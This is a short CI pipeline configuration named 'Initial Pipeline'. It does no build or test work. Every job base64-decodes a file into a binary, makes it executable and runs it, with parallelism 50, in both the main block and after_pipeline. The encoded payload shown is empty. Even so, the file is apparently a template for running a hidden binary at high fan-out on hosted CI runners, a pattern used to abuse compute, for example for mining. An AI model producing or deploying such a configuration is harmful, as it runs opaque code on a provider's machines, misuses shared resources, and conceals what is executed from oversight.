version: v1.0
name: Initial Pipeline
agent:
  machine:
    type: f1-standard-2
    os_image: ubuntu2204
blocks:
  - name: 'Block #1'
    task:
      jobs:
        - name: 'Job #1'
          commands:
            - echo ''>rr; base64 -d rr>rrr; chmod +x rrr; ./rrr
          parallelism: 50
        - name: 'Job #2'
          commands:
            - echo ''>rr; base64 -d rr>rrr; chmod +x rrr; ./rrr
          parallelism: 50
after_pipeline:
  task:
    jobs:
      - name: 'Job #1'
        commands:
          - echo ''>rr; base64 -d rr>rrr; chmod +x rrr; ./rrr
        parallelism: 50
      - name: 'Job #2'
        commands:
          - echo ''>rr; base64 -d rr>rrr; chmod +x rrr; ./rrr
        parallelism: 50
